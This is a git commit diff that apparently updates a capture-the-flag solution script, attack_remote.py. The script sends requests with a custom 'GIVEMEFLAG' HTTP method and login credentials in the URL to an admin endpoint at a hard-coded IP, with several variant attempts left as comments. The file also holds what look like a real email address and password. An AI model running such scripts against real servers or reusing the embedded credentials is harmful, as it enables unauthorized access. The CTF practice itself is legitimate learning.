5866de00c3ded9be17bffa2448f1e902ecc0968d
RobinHsieh <robin0623.hsieh@gmail.com>
2023-12-17 12:05:48 +0000

    solving ques1

--- web/01_Monster/attack_remote.py
+++ web/01_Monster/attack_remote.py
@@ -1,13 +1,40 @@
 import requests
+import json
 
 login_url = 'http://140.115.59.7:12002/admin'
+# login_url = 'http://140.115.59.7:12002/admin?username=hitori&password=🤘rockyou!!!'
+# login_url = 'http://140.115.59.7:12002/admin?username=hitori&password=rockyou!!!'
+login_url = 'http://140.115.59.7:12002/admin?username=robin0623.hsieh@gmail.com&password=En+447459209289'
 
-login_data = {
-    'username': 'hitori',
-    'password': 'rockyou!!!'
-}
+# login_headers = {
+    # 'Content-Type': 'application/json'
+# }
 
-response = requests.request("GIVEMEFLAG", login_url, data=login_data)
+# login_data = {
+    # 'username': 'robin0623.hsieh@gmail.com',
+    # 'password': 'En+447459209289'
+# }
+
+# login_data = json.dumps({
+    # 'username': 'robin0623.hsieh@gmail.com',
+    # 'password': 'En+447459209289'
+# })
+
+# login_data = {
+    # 'username': 'hitori',
+    # 'password': '🤘rockyou!!!'
+# }
+
+# login_data = json.dumps({
+    # 'username': 'hitori',
+    # 'password': '🤘rockyou!!!'
+# })
+
+# response = requests.request("GIVEMEFLAG", login_url, headers=login_headers, data=login_data)
+# response = requests.request("GIVEMEFLAG", login_url, data=login_data)
+response = requests.request("GIVEMEFLAG", login_url)
+# response = requests.request("POST", login_url)
+# response = requests.request("GET", login_url)
 
 print(response.text)
 
